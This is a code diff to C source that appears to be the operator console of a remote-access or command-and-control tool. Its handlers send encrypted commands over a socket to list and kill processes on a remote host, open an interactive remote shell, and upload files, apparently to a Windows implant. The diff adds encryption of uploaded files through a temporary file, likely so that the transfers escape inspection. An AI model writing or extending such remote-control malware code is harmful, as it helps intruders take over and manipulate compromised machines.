@@ -9,6 +9,7 @@
 #include <sys/sendfile.h>
 #include <sys/select.h>
 #include <sys/stat.h>
+#include <sys/mman.h>
 #include <fcntl.h>  
 #include <errno.h>
 #include <termios.h>
@@ -66,7 +67,7 @@ void HandleLspid(char *cmd,int client_socket){
 	encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
 	sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
 	if (sent_bytes == -1){
-		printf("[x] send() failed\n");
+		perror("[x] send() failed");
 		return;
 	}
 
@@ -77,7 +78,7 @@ void HandleLspid(char *cmd,int client_socket){
     do {
         bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
         if (bytes_received < 0) {
-            perror("[x] recv() failed\n");
+            perror("[x] recv() failed");
             exit(EXIT_FAILURE);
         }
         
@@ -111,7 +112,7 @@ void HandleShell(char *cmd,int client_socket) {
     // Send initial command
     sent_bytes = send(client_socket, cmd, strlen(cmd), 0);
     if (sent_bytes == -1) {
-        printf("[x] send() failed\n");
+        perror("[x] send() failed");
         return;
     }
     int stdin_flags = fcntl(STDIN_FILENO, F_GETFL, 0);
@@ -210,7 +211,7 @@ void HandleStopProcess(char *cmd, int client_socket){
     //printf("[+] THE PID is %s\n", space_pos + 1);     //DEBUG
 
     if (atoi(space_pos+1) == 0){
-        printf("[x] Invalid PID, please enter a valid value\n");
+        perror("[x] Invalid PID, please enter a valid value");
         return;
     }
 
@@ -220,7 +221,7 @@ void HandleStopProcess(char *cmd, int client_socket){
     encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
     sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
     if (sent_bytes == -1){
-        printf("[x] send() failed\n");
+        perror("[x] send() failed");
         return;
     }
 
@@ -228,7 +229,7 @@ void HandleStopProcess(char *cmd, int client_socket){
 
     bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
     if (bytes_received < 0) {
-        perror("[x] recv() failed\n");
+        perror("[x] recv() failed");
         exit(EXIT_FAILURE);
     }
 
@@ -268,6 +269,8 @@ int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsP
 
     // TODO: Encrypt the requested file to a tmp file and send it regularly and delete the tmp file.
 
+
+
     // Check if file exists
     //FILE* file = fopen(filename, "rb");
     int file = open(filename,O_RDONLY);
@@ -294,28 +297,90 @@ int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsP
     // send file size
     char file_size[BUFFER_SIZE];
     sprintf(file_size, "%ld", file_stat.st_size);
+
+    encrypt( (unsigned char *)file_size,(size_t) strlen(file_size));
+    printf("[+] Encrypt success\n");
     sent_bytes = send(client_socket,file_size,(size_t) sizeof(file_size),0);
     if (sent_bytes == -1){
         printf("[x] send() failed\n");
         return -1;
     }
+    printf("[+] send() file size success\n");
+    
 
+
+
+    // Create temporary file for encrypted data
+    char tmp_filename[] = "/tmp/encrypted_XXXXXX";
+    int tmp_fd = mkstemp(tmp_filename);
+    if (tmp_fd == -1) {
+        perror("[x] Failed to create temp file");
+        close(file);
+        return -1;
+    }
+    printf("[+] created tmp file\n");
+
+    // Read, encrypt, write to temp file
+    unsigned char buffer[BUFFER_SIZE];
+    ssize_t bytes_read;
+    
+    while ((bytes_read = read(file, buffer, BUFFER_SIZE)) > 0) {
+        // Encrypt buffer
+        encrypt((unsigned char *)buffer, (size_t) bytes_read);
+        
+        // Write to temp file
+        if (write(tmp_fd, buffer, bytes_read) != bytes_read) {
+            perror("[x] Failed to write to temp file");
+            close(file);
+            close(tmp_fd);
+            unlink(tmp_filename);
+            return -1;
+        }
+    }
+    printf("[+] Encrypted tmp file success\n");
+
+    char recv_buf[BUFFER_SIZE] = {0};
+    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE, 0);
+    if (bytes_received < 0) {
+        perror("[x] recv() failed");
+        close(file);
+        close(tmp_fd);
+        unlink(tmp_filename);
+        return -1;
+    }
+    
+    decrypt( (unsigned char *)recv_buf,(size_t) strlen(recv_buf));
+    int err_no = 692;
+    err_no = atoi(recv_buf);
+    printf("err_no is %d\n",err_no);
+    if (err_no != 692){
+        printf("[x] File couldn't be sent: %s\n",strerror(err_no));
+        close(file);
+        close(tmp_fd);
+        unlink(tmp_filename);
+        return -1;
+    }
 
     //send file data
     off_t offset = 0;
     int remain_data = file_stat.st_size;
 
-    while (((sent_bytes = sendfile(client_socket, file, &offset, BUFFER_SIZE)) > 0) && (remain_data > 0))
+    
+    
+    while (((sent_bytes = sendfile(client_socket, tmp_fd, &offset, BUFFER_SIZE)) > 0) && (remain_data > 0))
         {
-                fprintf(stdout, "1. Server sent %ld bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
+                fprintf(stdout, "Server sent %ld bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
                 remain_data -= sent_bytes;
-                fprintf(stdout, "2. Server sent %ld bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
+
         }
 
     
-    printf("\n[+] File sent successfully!\n");
+    
+    //printf("\n[+] File sent successfully!\n");
 
     close(file);
+    close(tmp_fd);
+    unlink(tmp_filename);
 
 
 
